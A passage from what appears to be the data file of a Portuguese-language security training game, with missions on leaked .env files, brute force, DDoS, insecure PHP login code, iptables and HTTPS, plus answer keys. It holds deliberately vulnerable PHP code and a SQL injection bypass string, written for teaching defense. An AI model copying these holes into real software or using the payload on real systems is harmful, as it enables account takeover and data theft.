      "/var/log/nginx/access.log": `192.168.1.50 - - [15/Jan/2024:09:00:01] "GET /.env HTTP/1.1" 200 1847
192.168.1.50 - - [15/Jan/2024:09:00:05] "GET /.git/config HTTP/1.1" 200 312
203.0.113.45 - - [15/Jan/2024:09:01:22] "GET /.env HTTP/1.1" 200 1847
203.0.113.45 - - [15/Jan/2024:09:01:25] "GET /docker-compose.yml HTTP/1.1" 200 589
185.220.101.3 - - [15/Jan/2024:09:02:01] "GET /.env HTTP/1.1" 200 1847`,
      "/var/www/html/app/README.md": `# FinanceApp Backend
Deploy: sudo docker-compose up -d
Credenciais de emergência: admin/FinEmerg#2024`
    },
    perguntas: [
      {
        id: 1,
        texto: "Qual arquivo representa o vazamento mais crítico e por quê?",
        opcoes: [
          { id: "a", texto: "README.md — expõe credenciais de emergência" },
          { id: "b", texto: ".env — expõe chaves AWS reais, Stripe live key, senha do BD de produção e JWT secret" },
          { id: "c", texto: "docker-compose.yml — expõe senhas do MySQL e Redis" },
          { id: "d", texto: ".git/COMMIT_EDITMSG — revela que houve commit acidental de credenciais" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Correto! O .env contém: chaves AWS reais (acesso à infraestrutura de nuvem), Stripe live key (acesso a dinheiro real de clientes), senha do banco de produção, e JWT secret. Um único arquivo que compromete toda a infraestrutura e dados financeiros.",
        feedback_errado: "Embora vários arquivos sejam críticos, o .env concentra as credenciais mais destrutivas: AWS (infraestrutura), Stripe live (dinheiro real), banco de produção (todos os dados). É o 'jackpot' de um atacante."
      },
      {
        id: 2,
        texto: "O access.log mostra IPs externos acessando /.env com resposta 200. O que isso significa?",
        opcoes: [
          { id: "a", texto: "É normal — o .env é um arquivo público da aplicação" },
          { id: "b", texto: "Atacantes externos já leram o arquivo .env com todas as credenciais" },
          { id: "c", texto: "O nginx está redirecionando requisições suspeitas" },
          { id: "d", texto: "São bots de monitoramento verificando a saúde da aplicação" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Perfeito! Código 200 significa que os arquivos foram entregues com sucesso. Três IPs diferentes (sendo um da rede interna) já baixaram o .env. Isso não é suspeita — é confirmação de comprometimento. As credenciais já foram roubadas.",
        feedback_errado: "HTTP 200 = arquivo entregue com sucesso. Três IPs externos fizeram GET em /.env e receberam o conteúdo completo (1847 bytes = tamanho do .env). As credenciais já estão nas mãos de atacantes."
      },
      {
        id: 3,
        texto: "O debug.log em /tmp contém número completo de cartão de crédito, CVV e CPF. Qual violação isso representa?",
        opcoes: [
          { id: "a", texto: "Apenas um problema de performance — logs grandes são ineficientes" },
          { id: "b", texto: "Violação do PCI-DSS (dados de cartão), LGPD (CPF/dados pessoais) e má prática de desenvolvimento" },
          { id: "c", texto: "É aceitável em ambiente de debug durante desenvolvimento" },
          { id: "d", texto: "O arquivo está em /tmp, então é temporário e não representa risco" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Correto! PCI-DSS proíbe explicitamente log de CVV e número completo de cartão. LGPD exige proteção de CPF e dados pessoais. Isso pode gerar multas milionárias, cancelamento do contrato com operadoras de cartão, e responsabilidade civil.",
        feedback_errado: "PCI-DSS (Payment Card Industry) proíbe TERMINANTEMENTE log de CVV — é requisito 3.2. LGPD protege CPF como dado pessoal sensível. 'Está em /tmp' não protege: /tmp é acessível por outros processos e pode ser indexado por scripts de backup."
      }
    ],
    conclusao: {
      o_que_aconteceu: "A aplicação expunha via web arquivos sensíveis (.env, .git, docker-compose.yml). O arquivo .env continha credenciais reais de AWS, Stripe e banco de produção. Logs de debug armazenavam dados de cartão completos e CPFs. O access.log confirma que atacantes já acessaram e baixaram as credenciais.",
      vulnerabilidade: "OWASP A02:2021 - Falhas Criptográficas + A05:2021 - Configuração Incorreta de Segurança. Credenciais em texto plano expostas via web, dados sensíveis em logs, arquivos de configuração no webroot.",
      risco: "Comprometimento total da infraestrutura AWS, fraudes financeiras via Stripe API, exfiltração de todos os dados de clientes, multas por violação de PCI-DSS e LGPD, danos reputacionais irreversíveis.",
      como_corrigir: "1. Rotacione IMEDIATAMENTE todas as credenciais expostas (AWS, Stripe, BD)\n2. Bloqueie acesso web a .env, .git, docker-compose.yml via nginx\n3. Mova .env para fora do webroot\n4. Desative APP_DEBUG em produção\n5. Nunca logue dados de cartão (CVV proibido pelo PCI-DSS)\n6. Use secrets managers (AWS Secrets Manager, HashiCorp Vault)",
      boa_pratica: "Regra 12-factor app: configurações via variáveis de ambiente, nunca em código ou arquivos comitados. Adicione .env ao .gitignore. Use 'git-secrets' para prevenir commits acidentais de credenciais. Realize varreduras automáticas com TruffleHog ou GitLeaks no CI/CD."
    }
  },

  {
    id: 6,
    titulo: "Força Bruta — Defesa",
    subtitulo: "Implantando mecanismos de proteção",
    dificuldade: "Difícil",
    tipo: "multipla_escolha",
    pontos_maximos: 200,
    icone: "🛡️",
    contexto: `Você é o responsável de segurança da plataforma <strong>CloudShop</strong>, um e-commerce com 500.000 clientes.
Seu SIEM disparou um alerta: nas últimas 2 horas, foram detectadas <strong>847.293 tentativas de login</strong>
originadas de 12.000 IPs diferentes, em velocidade de ~7.000 req/s.
Você precisa <strong>tomar decisões de defesa em tempo real</strong>.`,
    dica: "Considere o impacto nos usuários legítimos, a eficácia de cada medida e a velocidade de implementação.",
    perguntas: [
      {
        id: 1,
        texto: "O ataque usa 12.000 IPs diferentes (botnet). Qual estratégia de bloqueio é mais eficaz?",
        opcoes: [
          { id: "a", texto: "Bloquear todos os 12.000 IPs individualmente no firewall" },
          { id: "b", texto: "Implementar rate limiting por IP + CAPTCHA após 3 falhas + bloqueio temporário progressivo" },
          { id: "c", texto: "Desativar o login para todos os usuários até o ataque cessar" },
          { id: "d", texto: "Não fazer nada — o sistema vai aguentar" }
        ],
        correta: "b",
        pontos: 60,
        feedback_correto: "Correto! Rate limiting reduz a velocidade do ataque sem bloquear usuários legítimos. CAPTCHA torna automação custosa. Bloqueio progressivo (5min, 30min, 24h) pune reincidentes. Uma combinação de camadas é sempre mais eficaz.",
        feedback_errado: "Bloquear 12.000 IPs é ineficaz (o atacante adiciona mais), desativar o login afeta clientes reais. A estratégia correta combina rate limiting (reduz velocidade), CAPTCHA (torna automação cara) e bloqueio progressivo."
      },
      {
        id: 2,
        texto: "Você implementou MFA obrigatório. Por que isso neutraliza efetivamente ataques de força bruta em senhas?",
        opcoes: [
          { id: "a", texto: "O MFA deixa os usuários mais lentos para logar, atrasando o ataque" },
          { id: "b", texto: "Mesmo que o atacante descubra a senha correta, ainda precisa do segundo fator (que só o usuário legítimo tem)" },
          { id: "c", texto: "O MFA bloqueia IPs suspeitos automaticamente" },
          { id: "d", texto: "O MFA criptografa as senhas de forma mais forte" }
        ],
        correta: "b",
        pontos: 60,
        feedback_correto: "Exato! Com MFA, descobrir a senha é apenas metade do caminho. O atacante ainda precisa do TOTP (código de 30s), SMS ou chave física — que apenas o usuário legítimo possui. Força bruta na senha torna-se inútil.",
        feedback_errado: "MFA cria uma segunda camada independente da senha. Se um atacante força bruta e descobre 'senha123', ainda precisa do código TOTP que muda a cada 30 segundos ou da chave física. A senha comprometida sozinha não concede acesso."
      },
      {
        id: 3,
        texto: "Após conter o ataque, você descobre que 3.200 contas foram comprometidas por credential stuffing (senhas reutilizadas de outros vazamentos). Qual deve ser a PRIMEIRA ação?",
        opcoes: [
          { id: "a", texto: "Enviar e-mail para os 3.200 usuários pedindo para trocarem a senha quando possível" },
          { id: "b", texto: "Forçar logout e reset de senha para as 3.200 contas comprometidas imediatamente, notificar os usuários e reportar o incidente" },
          { id: "c", texto: "Monitorar as contas comprometidas por 48h antes de agir" },
          { id: "d", texto: "Desativar permanentemente as 3.200 contas para proteger os dados" }
        ],
        correta: "b",
        pontos: 80,
        feedback_correto: "Correto! Resposta a incidente padrão: contenção imediata (forçar logout/reset elimina o acesso do atacante agora), notificação dos usuários (transparência e LGPD exigem), reporte do incidente (obrigação legal em 72h pela LGPD/GDPR).",
        feedback_errado: "Cada minuto com contas comprometidas ativas é um minuto que o atacante pode exfiltrar dados, fazer compras fraudulentas ou causar danos. Ação imediata é crucial. E-mail 'quando possível' é inadequado — a contenção deve ser instantânea."
      }
    ],
    conclusao: {
      o_que_aconteceu: "Um ataque de credential stuffing em larga escala usou uma botnet de 12.000 IPs para testar 847.293 combinações de login em 2 horas. 3.200 contas foram comprometidas pois seus usuários reutilizavam senhas de vazamentos anteriores (HaveIBeenPwned).",
      vulnerabilidade: "Ausência de: rate limiting, MFA obrigatório, detecção de credential stuffing, verificação de senhas comprometidas no cadastro, alertas de login suspeito.",
      risco: "Contas comprometidas permitem: fraudes financeiras, roubo de dados pessoais (LGPD), danos à reputação da plataforma, responsabilidade legal.",
      como_corrigir: "1. Implemente MFA — torna credential stuffing ineficaz\n2. Verifique senhas contra HaveIBeenPwned API no cadastro e login\n3. Rate limiting + CAPTCHA progressivo\n4. Alertas de login de novo dispositivo/localização\n5. Monitoramento SIEM com alertas de anomalia",
      boa_pratica: "Zero-trust em autenticação: nunca confie apenas na senha. MFA + senhas verificadas contra vazamentos conhecidos + anomaly detection = conjunto mínimo para plataformas com dados sensíveis. Notifique usuários proativamente sobre logins suspeitos."
    }
  },

  {
    id: 7,
    titulo: "DDoS — Mitigação",
    subtitulo: "Respondendo a um ataque volumétrico",
    dificuldade: "Difícil",
    tipo: "multipla_escolha",
    pontos_maximos: 200,
    icone: "🌊",
    contexto: `Você é o engenheiro de segurança de plantão na <strong>NetBank Digital</strong>.
São 14h de uma sexta-feira. Seu sistema de monitoramento alerta:
<strong>O tráfego aumentou de 500 Mbps para 47 Gbps em 3 minutos.</strong>
A aplicação está fora do ar. Clientes não conseguem acessar o internet banking.
O time está aguardando sua análise e decisões.`,
    dica: "Um DDoS volumétrico busca esgotar largura de banda ou recursos do servidor. Pense em camadas de defesa.",
    perguntas: [
      {
        id: 1,
        texto: "Qual é a natureza deste ataque baseado nos dados de monitoramento?",
        opcoes: [
          { id: "a", texto: "Ataque de força bruta no servidor de login do banco" },
          { id: "b", texto: "Ataque DDoS volumétrico — tráfego 94x acima do normal visa saturar a conexão de internet" },
          { id: "c", texto: "Falha no servidor de banco de dados" },
          { id: "d", texto: "Pico de tráfego legítimo de clientes" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Correto! 47 Gbps em 3 minutos (94x o normal) é característico de DDoS volumétrico — provavelmente UDP flood, ICMP flood ou amplificação DNS/NTP. O objetivo é saturar o link de internet do banco, não explorar uma vulnerabilidade específica.",
        feedback_errado: "A escala (47 Gbps em 3 minutos, aumento de 94x) descarta tráfego legítimo. A velocidade de escalada e o volume apontam para DDoS volumétrico — possivelmente tráfego amplificado via DNS ou NTP reflection."
      },
      {
        id: 2,
        texto: "Qual medida técnica tem MAIOR impacto imediato na mitigação de um DDoS volumétrico?",
        opcoes: [
          { id: "a", texto: "Reiniciar o servidor web para limpar as conexões" },
          { id: "b", texto: "Ativar serviço de mitigação DDoS na borda (CDN/scrubbing center) para filtrar o tráfego malicioso antes de chegar ao datacenter" },
          { id: "c", texto: "Aumentar a RAM do servidor" },
          { id: "d", texto: "Bloquear todos os IPs estrangeiros no firewall" }
        ],
        correta: "b",
        pontos: 70,
        feedback_correto: "Correto! Um scrubbing center (Cloudflare, AWS Shield, Akamai) absorve o tráfego malicioso na nuvem, antes de chegar ao link do banco. Apenas tráfego limpo é encaminhado. É a única solução que funciona contra 47 Gbps — seu link de 10 Gbps já está saturado.",
        feedback_errado: "Reiniciar servidor não resolve saturação de link. Adicionar RAM não ajuda. Bloquear IPs estrangeiros é ineficaz (botnets usam IPs globais incluindo brasileiros). A solução é desviar o tráfego para um scrubbing center que absorve o ataque antes do seu datacenter."
      },
      {
        id: 3,
        texto: "Após mitigar o DDoS, a análise revela que foi usada como distração enquanto uma tentativa de SQL injection ocorria no sistema de pagamentos. Qual lição de segurança isso demonstra?",
        opcoes: [
          { id: "a", texto: "DDoS e SQL injection são sempre usados juntos — ambos são o mesmo tipo de ataque" },
          { id: "b", texto: "Atacantes sofisticados usam DDoS como cortina de fumaça para cobrir ataques mais sutis — defesa em profundidade é essencial" },
          { id: "c", texto: "O DDoS foi acidental e não tem relação com o SQL injection" },
          { id: "d", texto: "SQL injection é menos perigoso que DDoS, portanto pode ser ignorado" }
        ],
        correta: "b",
        pontos: 80,
        feedback_correto: "Análise excelente! 'DDoS como cortina de fumaça' (smoke screen attack) é uma técnica documentada: o DDoS ocupa toda a atenção do time de segurança e sobrecarrega sistemas de logging, enquanto o ataque real (SQL injection, data exfiltration) ocorre despercebido.",
        feedback_errado: "DDoS como cortina de fumaça é um vetor de ataque combinado documentado. Enquanto o time luta contra o DDoS, logs ficam saturados, alertas se perdem e a atenção humana está dividida — o momento perfeito para um ataque mais cirúrgico no backend."
      }
    ],
    conclusao: {
      o_que_aconteceu: "Um atacante (provavelmente um grupo organizado) usou um DDoS volumétrico de 47 Gbps como distração para tentar explorar SQL injection no sistema de pagamentos. A disponibilidade foi comprometida por horas. Sem monitoramento multicamada, o ataque real poderia ter passado despercebido.",
      vulnerabilidade: "Ausência de: serviço anti-DDoS contratado previamente, monitoramento de WAF ativo durante o incidente, playbook de resposta a incidentes DDoS, visibilidade nas camadas de aplicação durante ataques volumétricos.",
      risco: "Indisponibilidade do internet banking (prejuízo financeiro, reputacional), possível exfiltração de dados via SQL injection, violação regulatória (Banco Central exige RTO/RPO para serviços financeiros digitais).",
      como_corrigir: "1. Contrate solução anti-DDoS sempre ativa (não apenas quando o ataque começa)\n2. Implemente WAF (Web Application Firewall) com regras anti-SQL injection\n3. Crie playbook de resposta a incidentes DDoS com papéis definidos\n4. Separe o monitoramento de DDoS do monitoramento de aplicação\n5. Conduza exercícios (DDoS tabletop) com o time",
      boa_pratica: "Defesa em profundidade (Defense in Depth): múltiplas camadas de segurança independentes. Anti-DDoS na borda, WAF na camada de aplicação, IDS/IPS na rede interna, monitoramento de comportamento no banco de dados. Nenhuma camada isolada é suficiente."
    }
  },

  {
    id: 8,
    titulo: "Autenticação Insegura",
    subtitulo: "Auditando o sistema de login",
    dificuldade: "Difícil",
    tipo: "browser",
    pontos_maximos: 200,
    icone: "🌐",
    contexto: `Você foi contratado para realizar um <strong>Code Review de Segurança</strong> do sistema de autenticação
da startup <strong>MedConnect</strong> — uma plataforma de saúde digital com dados de pacientes.
Analise o código do sistema de login e identifique todas as vulnerabilidades.`,
    dica: "Procure por: SQL Injection, senhas em texto plano, tokens previsíveis, ausência de controles de segurança.",
    codigo_fonte: {
      "login.php": `<?php
// login.php — Sistema de Autenticação MedConnect
session_start();

if ($_POST['action'] == 'login') {
    $db = mysqli_connect("localhost", "root", "admin123", "medconnect");

    // Verificação de login
    $user = $_POST['username'];
    $pass = $_POST['password'];

    // Query de autenticação
    $query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
    $result = mysqli_query($db, $query);

    if (mysqli_num_rows($result) > 0) {
        $row = mysqli_fetch_assoc($result);
        $_SESSION['user_id'] = $row['id'];
        $_SESSION['username'] = $row['username'];
        $_SESSION['role'] = $row['role'];

        // Token de sessão simples
        $_SESSION['token'] = $row['id'] . '_' . time();

        // Log sem sanitização
        file_put_contents('/var/log/app.log',
            "Login: $user | Pass: $pass | IP: " . $_SERVER['REMOTE_ADDR'] . "\\n",
            FILE_APPEND
        );

        header("Location: dashboard.php");
    } else {
        // Mensagem de erro específica
        $error = "Usuário '$user' não encontrado ou senha incorreta";
        echo "<script>alert('$error')</script>";
    }
}
?>
<!DOCTYPE html>
<html>
<head><title>MedConnect - Login</title></head>
<body>
<form method="POST">
    <input type="hidden" name="action" value="login">
    <input type="text" name="username" placeholder="Usuário">
    <input type="text" name="password" placeholder="Senha" type="text">
    <input type="submit" value="Entrar">
</form>
<!-- TODO: remover antes do deploy
     Conta de teste: admin / admin123
     DB: root / admin123 -->
</body>
</html>`,
      "dashboard.php": `<?php
session_start();
// Verificação de autenticação
if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
}
// Sem verificação de expiração de sessão
// Sem validação de token
$user_id = $_GET['id']; // ID do usuário da URL
$query = "SELECT * FROM patients WHERE doctor_id = $user_id";
?>`
    },
    perguntas: [
      {
        id: 1,
        texto: "A query '$query = \"SELECT * FROM users WHERE username=\'$user\' AND password=\'$pass\'\"' é vulnerável a qual ataque clássico?",
        opcoes: [
          { id: "a", texto: "Cross-Site Scripting (XSS)" },
          { id: "b", texto: "SQL Injection — entrada não sanitizada concatenada diretamente na query" },
          { id: "c", texto: "Command Injection no servidor" },
          { id: "d", texto: "Buffer Overflow no banco de dados" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Correto! Inserindo username = ' OR '1'='1' -- , a query vira: SELECT * FROM users WHERE username='' OR '1'='1' -- AND password='...' — que retorna todos os usuários, concedendo acesso sem senha. Clássico SQL Injection.",
        feedback_errado: "A vulnerabilidade é SQL Injection. Se um atacante digitar no campo usuário: ' OR '1'='1' --  a query resultante ignora a verificação de senha completamente. A concatenação direta de input do usuário em queries SQL é sempre insegura."
      },
      {
        id: 2,
        texto: "O código loga 'Pass: $pass' (a senha em texto plano nos logs). Além da exposição da senha, qual OUTRA vulnerabilidade isso cria?",
        opcoes: [
          { id: "a", texto: "Logs muito grandes tornam o servidor lento" },
          { id: "b", texto: "Qualquer pessoa com acesso aos logs obtém todas as senhas; viola LGPD e PCI-DSS; impede que usuários usem a mesma senha em outros serviços com segurança" },
          { id: "c", texto: "O arquivo de log pode ficar corrompido" },
          { id: "d", texto: "É apenas um problema de privacidade menor" }
        ],
        correta: "b",
        pontos: 70,
        feedback_correto: "Análise completa! Logs com senhas: qualquer sysadmin lê as senhas de todos, backups de logs expõem credenciais, rotação de logs significa senhas históricas espalhadas pelo sistema. LGPD e PCI-DSS proíbem explicitamente o armazenamento de senhas em qualquer forma legível.",
        feedback_errado: "Senhas em logs violam: (1) LGPD — dado sensível armazenado desnecessariamente, (2) PCI-DSS — dado de autenticação em texto, (3) segurança — qualquer sysadmin com acesso a /var/log tem as senhas de todos. Logs nunca devem conter credenciais."
      },
      {
        id: 3,
        texto: "O campo 'password' no HTML é do tipo 'text' (não 'password'). Além de mostrar a senha na tela, quais outros riscos isso cria?",
        opcoes: [
          { id: "a", texto: "Nenhum risco adicional — é apenas visual" },
          { id: "b", texto: "A senha fica visível para shoulder surfing, é armazenada pelo autocompletar do browser, fica visível em gravações de tela e capturas de tela" },
          { id: "c", texto: "O campo texto é mais rápido de processar que o campo password" },
          { id: "d", texto: "Apenas usuários com dificuldade de digitação se beneficiariam" }
        ],
        correta: "b",
        pontos: 80,
        feedback_correto: "Exato! type='text' para senha: aparece em shoulder surfing (alguém olhando a tela), é salva pelo autocompletar como texto normal, aparece em gravações de suporte/demonstração, capturada por keyloggers que rastreiam campos de texto. type='password' é um controle de segurança obrigatório.",
        feedback_errado: "type='password' existe por razões de segurança reais: mascara da visão de terceiros (shoulder surfing), previne captura por alguns keyloggers, sinaliza ao browser para não fazer autocomplete público, e não aparece em 'salvar senha como texto' no cache do browser."
      }
    ],
    conclusao: {
      o_que_aconteceu: "O sistema de autenticação da MedConnect tinha múltiplas vulnerabilidades críticas: SQL injection permitindo bypass de autenticação, senhas armazenadas em texto plano nos logs, token de sessão previsível (user_id + timestamp), campo de senha como texto visível, e credenciais hardcoded em comentário HTML público.",
      vulnerabilidade: "OWASP Top 10: A03 - SQL Injection, A07 - Falhas de Identificação e Autenticação, A09 - Falhas de Log. Combinação de falhas elementares em um sistema com dados de saúde (extremamente sensíveis pela LGPD).",
      risco: "Bypass total de autenticação via SQL injection, exposição de dados de saúde de pacientes, violação grave da LGPD (dados de saúde são categoria especial), comprometimento de credenciais de todos os usuários via logs.",
      como_corrigir: "1. Use Prepared Statements/PDO para queries (eliminam SQL injection)\n2. Nunca logue senhas — logue apenas username e timestamp\n3. Armazene senhas com bcrypt/Argon2 (nunca texto plano)\n4. Use tokens de sessão criptograficamente seguros (random_bytes)\n5. type='password' obrigatório em campos de senha\n6. Remova comentários com credenciais do HTML",
      boa_pratica: "OWASP ASVS (Application Security Verification Standard) define requisitos mínimos de autenticação segura. Use frameworks que implementam segurança por padrão (Laravel, Django) ao invés de código de autenticação manual. Realize code review focado em segurança antes de qualquer deploy em produção."
    }
  }
,

  // ─── MISSÃO 9 ─────────────────────────────────────────────────────────────
  {
    id: 9,
    titulo: "Firewall com iptables",
    subtitulo: "Protegendo um servidor Linux com regras de firewall",
    dificuldade: "Difícil",
    tipo: "terminal",
    pontos_maximos: 200,
    icone: "🧱",
    contexto: `Você foi contratado como analista de segurança pela <strong>LogiTrans Ltda</strong>.
O servidor de produção está exposto à internet <strong>sem nenhuma regra de firewall</strong>.
Logs mostram tentativas de invasão nas últimas 24h. Sua missão: <strong>analisar a configuração
atual e definir a política correta de firewall com iptables</strong>.`,
    dica: "Use <code>cat /etc/iptables/rules.v4</code> e <code>cat /var/log/firewall.log</code> para analisar o problema.",
    filesystem: {
      "/": ["etc", "var", "home"],
      "/etc": ["iptables", "nginx"],
      "/etc/iptables": ["rules.v4"],
      "/var": ["log"],
      "/var/log": ["firewall.log", "auth.log"],
      "/home": ["analista"]
    },
    files: {
      "/etc/iptables/rules.v4": `# iptables — LogiTrans Servidor de Produção
# STATUS: Política padrão INSEGURA

*filter
:INPUT ACCEPT [0:0]
:FORWARD DROP [0:0]
:OUTPUT ACCEPT [0:0]

-A INPUT -i lo -j ACCEPT
-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# ATENÇÃO: Sem regras de bloqueio — tudo liberado!
# PORTAS ABERTAS PARA INTERNET: 21(FTP), 22(SSH), 23(Telnet),
# 80(HTTP), 443(HTTPS), 3306(MySQL), 5432(Postgres), 8080(dev)
COMMIT`,
      "/var/log/firewall.log": `Jan 15 02:14:33 kernel: IN=eth0 SRC=45.33.32.156 DPT=23 (Telnet scan)
Jan 15 02:14:51 kernel: IN=eth0 SRC=45.33.32.156 DPT=3306 (MySQL direto!)
Jan 15 02:15:01 kernel: IN=eth0 SRC=185.220.101.3 DPT=22 (SSH brute force)
Jan 15 02:15:02 kernel: IN=eth0 SRC=185.220.101.3 DPT=22
Jan 15 02:15:03 kernel: IN=eth0 SRC=185.220.101.3 DPT=22
Jan 15 02:15:04 kernel: IN=eth0 SRC=185.220.101.3 DPT=22
Jan 15 02:15:05 kernel: IN=eth0 SRC=185.220.101.3 DPT=22
Jan 15 03:22:10 kernel: IN=eth0 SRC=103.21.244.0 DPT=8080 (servidor dev exposto!)
Jan 15 03:22:15 kernel: IN=eth0 SRC=103.21.244.0 DPT=5432 (Postgres exposto!)`,
      "/var/log/auth.log": `Jan 15 02:15:01 sshd[3821]: Failed password for root from 185.220.101.3
Jan 15 02:15:02 sshd[3822]: Failed password for root from 185.220.101.3
Jan 15 02:15:03 sshd[3823]: Failed password for admin from 185.220.101.3
Jan 15 02:15:04 sshd[3824]: Failed password for ubuntu from 185.220.101.3
Jan 15 02:15:05 sshd[3825]: Failed password for pi from 185.220.101.3
Jan 15 02:15:06 sshd[3826]: Accepted password for analista from 185.220.101.3
# ALERTA: Senha fraca descoberta por brute force!`
    },
    perguntas: [
      {
        id: 1,
        texto: "O arquivo rules.v4 mostra ':INPUT ACCEPT' — aceita qualquer conexão. Qual é a política padrão CORRETA para um firewall seguro, seguindo o princípio do menor privilégio?",
        opcoes: [
          { id: "a", texto: "Manter INPUT ACCEPT e bloquear apenas IPs conhecidos maliciosos" },
          { id: "b", texto: "Mudar para INPUT DROP (bloqueia tudo por padrão) e adicionar regras ACCEPT explícitas apenas para portas 22, 80 e 443" },
          { id: "c", texto: "Manter INPUT ACCEPT mas instalar antivírus no servidor" },
          { id: "d", texto: "Usar OUTPUT DROP — o tráfego de saída é mais perigoso" }
        ],
        correta: "b",
        pontos: 60,
        feedback_correto: "Correto! 'Default Deny': bloqueie TUDO por padrão (INPUT DROP) e libere apenas o necessário. Telnet (23) deve ser removido — usa texto plano. MySQL (3306) jamais deve ser exposto à internet — use tunnel SSH.",
        feedback_errado: "A abordagem correta é 'default deny': INPUT DROP bloqueia tudo, depois você abre portas específicas. Bloquear IPs maliciosos conhecidos é ineficaz — existem bilhões deles. Portas como Telnet (23) e MySQL (3306) nunca devem ser expostas à internet."
      },
      {
        id: 2,
        texto: "O log mostra 5 tentativas de SSH em 5 segundos do mesmo IP — brute force clássico. Qual regra iptables previne isso com rate limiting?",
        opcoes: [
          { id: "a", texto: "-A INPUT -p tcp --dport 22 -j DROP (bloquear SSH completamente)" },
          { id: "b", texto: "-A INPUT -p tcp --dport 22 -m recent --name SSH --update --seconds 60 --hitcount 5 -j DROP (máximo 5 tentativas por minuto por IP)" },
          { id: "c", texto: "-A INPUT -s 185.220.101.3 -j DROP (bloquear apenas esse IP)" },
          { id: "d", texto: "-A INPUT -p tcp --dport 22 -m state --state NEW -j ACCEPT" }
        ],
        correta: "b",
        pontos: 80,
        feedback_correto: "Perfeito! O módulo '--recent' rastreia tentativas por IP. '--hitcount 5 --seconds 60' bloqueia quem fizer 5 conexões em 60 segundos. Não derruba SSH legítimo mas inviabiliza brute force automatizado.",
        feedback_errado: "Bloquear SSH completamente impede o administrador de acessar o servidor. Bloquear um IP fixo é ineficaz (botnets usam milhares de IPs). A solução é rate limiting com '--recent'."
      },
      {
        id: 3,
        texto: "Além do iptables, o servidor tem FTP (21) e servidor de dev (8080) expostos. Qual estratégia de hardening complementa o firewall?",
        opcoes: [
          { id: "a", texto: "Mudar as portas para números altos (ex: FTP na 2121) para esconder dos scanners" },
          { id: "b", texto: "Desabilitar serviços desnecessários (systemctl disable vsftpd), substituir FTP por SFTP, remover servidor dev de produção, e instalar fail2ban para automação de bloqueio" },
          { id: "c", texto: "Adicionar senha forte nos serviços FTP e dev — ficam seguros mesmo abertos" },
          { id: "d", texto: "Deixar aberto e monitorar com antivírus" }
        ],
        correta: "b",
        pontos: 60,
        feedback_correto: "Excelente! Defense in depth: (1) desative o que não usa — superfície de ataque zero, (2) substitua protocolos inseguros (FTP→SFTP), (3) separe dev de prod, (4) fail2ban automatiza bloqueio baseado em logs. Firewall é uma camada, não a solução completa.",
        feedback_errado: "Security through obscurity (mudar porta) não funciona — nmap detecta serviços em qualquer porta. FTP transmite senhas em texto plano independente da senha usada. A solução é eliminar a superfície de ataque: desative o que não usa."
      }
    ],
    conclusao: {
      o_que_aconteceu: "O servidor da LogiTrans estava completamente exposto: política INPUT ACCEPT aceitava qualquer conexão, Telnet e MySQL acessíveis da internet, brute force SSH bem-sucedido por senha fraca, e ambiente de desenvolvimento público.",
      vulnerabilidade: "Ausência de firewall configurado, princípio do menor privilégio não aplicado, serviços legados ativos (FTP, Telnet), ambiente dev em produção.",
      risco: "Comprometimento total: acesso root via SSH brute force, banco de dados MySQL exposto, dados de desenvolvimento acessíveis.",
      como_corrigir: "1. iptables INPUT DROP por padrão, ACCEPT apenas nas portas 22, 80, 443\n2. Rate limiting SSH com módulo --recent ou fail2ban\n3. Desabilitar Telnet e FTP — usar SSH/SFTP\n4. MySQL acessível apenas via 127.0.0.1\n5. Separar ambiente dev de produção\n6. Salvar regras: iptables-save > /etc/iptables/rules.v4",
      boa_pratica: "Princípio do menor privilégio aplicado a redes: um servidor web precisa apenas das portas 80 e 443 ao mundo. SSH idealmente restrito a IPs específicos. Ferramentas: fail2ban para automação, UFW como front-end amigável do iptables, nftables para configurações mais modernas."
    }
  },

  // ─── MISSÃO 10 ────────────────────────────────────────────────────────────
  {
    id: 10,
    titulo: "DNS e Certificado SSL",
    subtitulo: "Colocando um site no ar com domínio e HTTPS configurados",
    dificuldade: "Difícil",
    tipo: "terminal",
    pontos_maximos: 200,
    icone: "🔒",
    contexto: `A startup <strong>EduTech Brasil</strong> lançou sua plataforma de cursos online.
O servidor está no ar com IP <code>177.34.56.78</code>, mas <strong>sem domínio e sem HTTPS</strong> —
dados de alunos (senhas e pagamentos) trafegam em texto plano.
Sua missão: configurar DNS corretamente e instalar um certificado SSL válido.`,
    dica: "Leia <code>cat /home/admin/dns-checklist.txt</code> e <code>cat /etc/nginx/sites-available/edutech</code> para entender o que precisa ser feito.",
    filesystem: {
      "/": ["etc", "home", "var"],
      "/etc": ["nginx", "letsencrypt"],
      "/etc/nginx": ["sites-available"],
      "/etc/nginx/sites-available": ["edutech"],
      "/etc/letsencrypt": ["live"],
      "/home": ["admin"],
      "/home/admin": ["dns-checklist.txt", "ssl-report.txt"],
      "/var": ["log"],
      "/var/log": ["letsencrypt.log"]
    },
    files: {
      "/home/admin/dns-checklist.txt": `# EduTech Brasil — DNS + SSL Setup
# Servidor: 177.34.56.78 (DigitalOcean SP)
# Domínio registrado: edutech.com.br (Registro.br)

TAREFAS:
[ ] 1. Criar registro DNS tipo A: edutech.com.br → 177.34.56.78
[ ] 2. Criar registro DNS tipo A: www.edutech.com.br → 177.34.56.78
[ ] 3. Aguardar propagação DNS (TTL 300s — pode levar até 48h)
[ ] 4. Verificar propagação: dig edutech.com.br +short
[ ] 5. Instalar certbot: apt install certbot python3-certbot-nginx
[ ] 6. Emitir certificado: certbot --nginx -d edutech.com.br -d www.edutech.com.br
[ ] 7. Configurar redirect HTTP → HTTPS no nginx
[ ] 8. Adicionar HSTS header
[ ] 9. Testar: curl -I https://edutech.com.br

PROBLEMA ATUAL: HTTP puro — dados em texto plano na rede!`,
      "/etc/nginx/sites-available/edutech": `# Configuração ATUAL — SEM SSL (INSEGURA)
server {
    listen 80;
    server_name edutech.com.br www.edutech.com.br;
    root /var/www/edutech/public;
    index index.php index.html;

    location ~ \\.php$ {
        fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;
        include fastcgi_params;
    }

    # PROBLEMAS:
    # - Sem SSL/TLS — dados em texto plano
